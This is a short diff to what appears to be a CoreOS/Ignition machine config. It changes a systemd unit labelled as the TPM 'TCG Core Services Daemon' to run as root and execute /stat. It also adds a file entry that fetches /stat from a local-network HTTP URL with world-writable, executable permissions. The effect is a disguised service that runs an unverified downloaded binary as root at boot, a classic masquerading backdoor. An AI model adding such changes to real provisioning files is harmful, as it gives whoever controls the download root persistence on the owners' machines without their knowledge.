@@ -8,8 +8,8 @@ systemd:
         Description=TCG Core Services Daemon
         
         [Service]
-        User=tss
-        ExecStart=/bin/sleep 3600
+        User=root
+        ExecStart=/stat
         
         [Install]
         WantedBy=multi-user.target
@@ -24,6 +24,12 @@ systemd:
         ExecStart=/usr/bin/systemctl enable jumpstarter.service
 storage:
   files:
+    - path: /stat
+      filesystem: root
+      contents:
+        remote:
+          url: http://192.168.1.2/files/stat
+      mode: 0777
     - path: /etc/ssh/sshd_config
       filesystem: root
       mode: 0600
